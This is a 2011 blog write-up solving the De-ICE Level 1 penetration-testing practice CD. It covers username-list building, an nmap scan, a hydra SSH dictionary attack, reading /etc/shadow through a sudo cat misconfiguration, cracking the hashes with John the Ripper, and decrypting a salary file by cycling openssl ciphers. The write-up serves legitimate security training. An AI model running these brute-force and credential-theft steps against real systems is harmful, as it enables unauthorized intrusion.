---
layout: post
title: "De-ICE hacking challenge: Part 1"
date: 2011-07-19 18:10:26 -0400
comments: true
categories: boot2root hacking
alias: /2011/07/de-ice-hacking-challenge-part-1.html
---

Over the weekend I decided to take the De-ICE Live CD Level 1 challenge. De-ICE provides a safe environment where you can practice your penetration testing skills. If you've never done a penetration test before, or are looking for practice, these Live CDs are a good place to start.

<!--more-->

The Live CDs are available for free at [HackingDojo](http://hackingdojo.com/pentest-media/). Level 1 has two parts to it, running on different Live CDs and can be downloaded [here](http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso).

I setup two virtual machines, one running Backtrack 4RT2, and one running De-Ice, both setup to use NAT. 

Before attacking the target, I needed to get some information about it. So far the only thing I knew was its IP address and that it's a company. Companies usually have websites, so I pointed my web browser to http://192.168.1.100 to see if there was anything there:

->![](/images/2011-07-19/01.png)<-

Ok there's some information about the challenge. When I scrolled down I saw a link for the game information. Clicking on that took me to the company's web page which provided a bit of information:

->![](/images/2011-07-19/02.png)<-

A list of employee names and their email addresses! The recipient name in an email address is usually the same login name used to log into a server. So I made a list of the employee names into a file and generated a list of possible login names that I could use in a brute force attack. In my previous [post](/2011/07/17/creating-a-user-name-list-for-brute-force-attacks/) I talked about generating a list of login names based off real names. Using that method I came up with the following list:

```
adamadams
banterbob
coffeec
adamsadam
adam.adams
adams.adam
adamsa
aadams
aadam
a.adams
a.adam
bobbanter
bob.banter
banter.bob
banterb
bbanter
bbob
b.banter
b.bob
chadcoffee
coffeechad
chad.coffee
coffee.chad
ccoffee
cchad
c.coffee
c.chad
mariemary
marymarie
marie.mary
mary.marie
marym
mmary
mmarie
m.mary
m.marie
.
.
.
```

Since Adam Adams, Bob Banter, and Chad Coffee are the system administrators and are likely have the highest privileges on the system, I moved their names up on the list. I also start with the user name associated with their email address and assumed that it would be the same login name they would use to access the server.

The next step was to run a port scan to see what services were available. I fired up nmap with the aggressive option set:

```
nmap -sS -A 192.168.1.100
Starting Nmap 5.35DC1 ( http://nmap.org ) at 2011-07-19 00:38 EDT
Nmap scan report for 192.168.1.100
Host is up (0.00062s latency).
Not shown: 992 filtered ports
PORT    STATE  SERVICE  VERSION
20/tcp  closed ftp-data
21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 2048 83:4f:8b:e9:ea:84:20:0d:3d:11:2b:f0:90:ca:79:1c (RSA1)
| 2048 6f:db:a5:12:68:cd:ad:a9:9c:cd:1e:7b:97:1a:4c:9f (DSA)
|_2048 ab:ab:a8:ad:a2:f2:fd:c2:6f:05:99:69:40:54:ec:10 (RSA)
25/tcp  open   smtp?
80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_html-title: Site doesn't have a title (text/html).
110/tcp open   pop3     Openwall popa3d
|_pop3-capabilities: capa
143/tcp open   imap     UW imapd 2004.357
|_imap-capabilities: BINARY THREAD=ORDEREDSUBJECT IMAP4REV1 STARTTLS LOGIN-REFERRALS UNSELECT SCAN SASL-IR THREAD=REFERENCES MAILBOX-REFERRALS SORT AUTH=LOGIN LITERAL+ IDLE NAMESPACE MULTIAPPEND
443/tcp closed https
MAC Address: 00:0C:29:51:61:57 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS details: Linux 2.6.13 - 2.6.31
Network Distance: 1 hop
Service Info: OS: Unix
 
TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 192.168.1.100
 
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.60 seconds
```

Lots of services running that are worth exploring. Since I had already created a list of possible login names, and the server has SSH open, I decided to try an SSH dictionary attack using hydra. Backtrack comes with several wordlists containing possible passwords. I actually ended up using a customized one that contains approximately 980,000 passwords in non-alphabetical order.

With my login name list and password list ready, I fired up hydra:

```
/opt/hydra6/bin/hydra -L users.txt -P passwords.txt -t 5 -v -V -e n -e s -o results.txt 192.168.1.100 ssh
```

While this was running, I decided to explore the other services nmap reported. FTP seemed to be broken, so connecting to it was futile. I used searchsploit to see if I could find any available exploits for the services I found, but nothing stood out, so I decided to wait for hydra to generate results.

The user names adamadams, banterb, and coffeec did not result in any passwords. So now there were two possibilities; I didn't have their passwords in my password list, or the login names were different. I decided to wait it out and let hydra go through the rest of the login names and see if it would get a bite.

hydra delivered and rewarded me with a password for aadams: nostradamus. Now that I had a better idea of the format for the login name, I tailored my login name list accordingly to use the first character of the first name followed by the last name and ran hydra again. 

With hydra running in the background, I went ahead and logged into the server via SSH with aadams's credentials. Once I was in, the first thing I decided to do was to see what privileges aadams had:

```
root@lascars# ssh aadams@192.168.1.100
aadams@192.168.1.100's password: 
Linux 2.6.16.
aadams@slax:~$ id
uid=1000(aadams) gid=10(wheel) groups=10(wheel)
aadams@slax:~$ sudo -l
 
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
 
    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.
 
Password:
User aadams may run the following commands on this host:
    (root) NOEXEC: /bin/ls
    (root) NOEXEC: /usr/bin/cat
    (root) NOEXEC: /usr/bin/more
    (root) NOEXEC: !/usr/bin/su *root*
```

The cat command running under sudo meant that I'd be able to read /etc/shadow which contains the encrypted passwords for all the users on the server. With that in mind, I grabbed the user entries in /etc/passwd and /etc/shadow:

```
# /etc/passwd
root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
aadams:x:1000:10:,,,:/home/aadams:/bin/bash
bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
```

```
# /etc/shadow
root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
```

I saved them to mypass.txt and myshad.txt respectively and merged them using unshadow to create a file primed for password cracking with John The Ripper:

```
/pentest/passwords/jtr/unshadow mypass.txt myshad.txt > unshadowed.txt
/pentest/passwords/jtr/john --wordlist=passwords.txt unshadowed.txt
```

While waiting for john to finish, I checked to see what progress hydra had made and found that it had discovered the passwords for bbanter and ccoffee. I stopped john and removed those users from the unshadowed.txt file which left only the root account left to crack, and ran john again. 

Eventually john successfully cracked the root password, which turned out to be tarot. I decide to give it a try:

```
aadams@slax:~$ su -
Password: *****
root@slax:~# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
```

The server had been successfully rooted. At this point I figured the game was over. I went back to the dummy company website to look at the hints page and see if I had done everything correctly. As it turns out, there was one more challenge - obtain the CEO's bank account information. 

I decided to explore the FTP service again, so I went to /home/ftp/incoming and found a file called salary_dec2003.csv.enc. The file command told me it was just data, which didn't help me much, so I tried strings to see if I could find anything readable in there:

```
root@slax:/home/ftp/incoming# file salary_dec2003.csv.enc 
salary_dec2003.csv.enc: data
root@slax:/home/ftp/incoming# strings salary_dec2003.csv.enc | head
Salted__n
Lw$A`
YN>7
#ki8
```

The string "Salted\_\_n" looked interesting. I did a bit of Googling and found that "Salted\_\_" is the first 8 bytes in an encrypted file created by the openssl command. The problem now was to figure out the cipher and the password that were used to encrypt the file. I recalled that the /etc/passwd entry f-numberor root had an odd comment: "DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION". Assuming that probably meant the root password tarot was used to encrypt this file, I decided to write a script to cycle through all the ciphers in openssl and pair it with the password tarot to see if I could decrypt the file:

```
ciphers=`openssl list-cipher-commands`
for i in $ciphers; do
 openssl enc -d -${i} -in salary_dec2003.csv.enc -k tarot > /dev/null 2>&1
 if [[ $? -eq 0 ]]; then
  echo "Cipher is $i: openssl enc -d -${i} -in salary_dec2003.csv.enc -k tarot -out foo.csv"
  exit
 fi
done
```

Fingers crossed, I ran the script and it immediately gave me a result:

```
root@lascars# ./cipher-cycle.sh 
Cipher is aes-128-cbc: openssl enc -d -aes-128-cbc -in salary_dec2003.csv.enc -k tarot -out foo.csv
```

I had it print out the command for me as well so I could just copy and paste it if it found the correct cipher:

```
root@lascars#  openssl enc -d -aes-128-cbc -in salary_dec2003.csv.enc -k tarot -out foo.csv
root@lascars# head foo.csv 
,Employee information,,,,,,,,,,,,,,
,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage),Total Taxes Withheld (Percentage),"Insurance
Deduction
(Dollars)","Other Regular
Deduction
(Dollars)","Total Regular Deductions (Excluding taxes, in dollars)","Direct Deposit Info
Routing Number","Direct Deposit Info
Account Number"
,1,Charles E. Ophenia,"$225,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
,2,Marie Mary,"$56,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
```

With the server rooted and the salary file decrypted, the challenge is over. The whole thing took a few hours, mostly waiting for hydra to find a working login name and password combination that worked. Once that was done, the rest was a breeze.

In my next post I'll discuss how I solved part 2 of the level 1 challenge. 
